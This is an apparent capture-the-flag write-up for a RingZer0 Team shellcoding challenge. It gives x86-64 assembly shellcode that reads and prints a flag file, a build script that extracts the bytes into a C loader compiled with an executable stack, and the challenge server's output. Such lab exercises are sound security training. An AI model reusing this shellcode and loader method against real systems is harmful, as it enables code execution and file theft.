# Shellcoding level 1 - Challenge 127

To read the flag file, I used the following shellcode:

``` asm
 BITS 64
global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
  
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/flag/level1.flag"
```

Here's the little build script I wrote to automate the build and testing:

``` sh
#!/bin/sh
nasm -f elf64 -o read_flag.o read_flag.s
ld -o read_flag read_flag.o
rm shellcode.txt	
for i in `objdump -d read_flag | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\\x$i" >> shellcode.txt ; done
echo "#include <stdio.h>" > shellcode.c
echo "#include <string.h>" >> shellcode.c
echo "char code[] = \"`cat shellcode.txt`\";" >> shellcode.c
echo "int main(int argc, char *argv[]) { (*(void(*)()) code)(); return 0; }" >> shellcode.c
gcc -o shellcode shellcode.c -fno-stack-protector -zexecstack
./shellcode
```

Here's the flag:

```
shellcode>\xeb\x3b\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xc0\xff\xff\xff\x2f\x66\x6c\x61\x67\x2f\x6c\x65\x76\x65\x6c\x31\x2e\x66\x6c\x61\x67
	Shellcode received...
	Shellcode length (83) bytes.

	Success: Executing shellcode...

FLAG-1Ql864**************************
Connection to shellcode.ringzer0team.com closed.
```